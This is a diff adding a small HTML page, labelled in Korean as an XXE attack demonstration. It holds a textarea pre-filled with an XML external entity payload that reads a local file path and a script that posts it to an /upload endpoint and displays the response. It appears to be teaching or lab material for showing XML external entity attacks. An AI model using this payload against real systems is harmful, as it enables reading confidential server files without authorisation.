@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>XXE 공격 시연</title>
+</head>
+<body>
+    <h1>XXE 공격 시연</h1>
+    <form id="xmlForm">
+        <textarea name="xmlData" id="xmlData" rows="10" cols="50">
+<?xml version="1.0"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///path/to/file/test.txt">
+]>
+<foo>&xxe;</foo>
+        </textarea>
+        <br><br>
+        <button type="button" id="sendButton">XML 데이터 전송</button>
+    </form>
+    <h2>서버 응답</h2>
+    <pre id="serverResponse"></pre>
+
+    <script>
+        document.getElementById('sendButton').addEventListener('click', async () => {
+            const formData = new FormData(document.getElementById('xmlForm'));
+            const response = await fetch('/upload', {
+                method: 'POST',
+                body: formData
+            });
+            const result = await response.text();
+            document.getElementById('serverResponse').textContent = result;
+        });
+    </script>
+</body>
+</html>
